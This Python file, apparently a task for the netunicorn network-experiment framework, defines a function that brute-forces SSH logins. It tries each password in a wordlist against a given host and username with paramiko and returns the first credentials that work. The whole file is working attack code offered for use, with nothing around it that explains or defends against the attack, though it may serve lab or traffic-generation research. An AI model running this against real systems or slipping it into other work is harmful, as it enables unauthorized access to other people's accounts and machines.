import paramiko
from termcolor import colored # termcolor can be used to make text in terminal colorful!
from os import path # imported to check if workslist location does exist or not !
from sys import exit # for exiting the program
from netunicorn.base import Failure, Result, Success
from netunicorn.base.task import Task

def bruteforce_ssh(host, port, username, wordlist):
    # creating a sshclient object with paramiko !
    ssh = paramiko.SSHClient()
    # Configuring to auto add any missing policy if found
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in wordlist:
        # print(password)
        try:
            # trying to  connect
            ssh.connect(host, port=port, username=username,
                        password=password, banner_timeout=800)
        except:
            print(f"[Attempt] target:- {host} - login:{username} - password:{password}")
        else:
            ssh.close()
            return Success(f'Login successful: User - {username}, Password - {password}')
        finally:
            # After all the work closing the connection
            ssh.close()
    return Failure('No valid credentials found in wordlist')

